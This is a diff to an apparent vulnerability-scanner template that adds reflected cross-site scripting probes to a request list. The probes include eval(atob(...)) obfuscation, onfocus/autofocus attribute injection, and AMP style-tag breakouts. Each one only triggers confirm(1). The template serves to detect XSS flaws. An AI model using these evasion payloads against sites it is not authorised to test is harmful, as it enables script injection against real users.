@@ -20,7 +20,14 @@ requests:
       - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
       - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
       - "{{BaseURL}}'<iframe/onload=confirm(1)>"
-
+      - '{{BaseURL}}" onfocus="eval(atob(%27Y29uZmlybSgxKQ==%27))" autofocus="" a="a'
+      - '{{BaseURL}}"><input onfocus="eval(atob(%27Y29uZmlybSgxKQ==%27))" autofocus="">'      
+      - '{{BaseURL}}"><svg onload=confirm(1)>'
+      - '{{BaseURL}}""><img src=x id="Y29uZmlybSgxKQ==" onerror=eval(atob(this.id))>'     
+      - "{{BaseURL}}<style amp-custom>[id='</st\000079le></head><body><img src=x onerror=confirm(1)>']{color:blue}</style>"
+      - "{{BaseURL}}'><style amp-custom>[id='</st\000079le></head><body><img src=x onerror=confirm(1)>']{color:blue}</style>"  
+      - '{{BaseURL}}"><style amp-custom>[id=%27</st\000079le></head><body><img src=x onerror=confirm(1)>%27]{color:blue}</style>'
+      
     matchers-condition: and
     matchers:
       - type: word
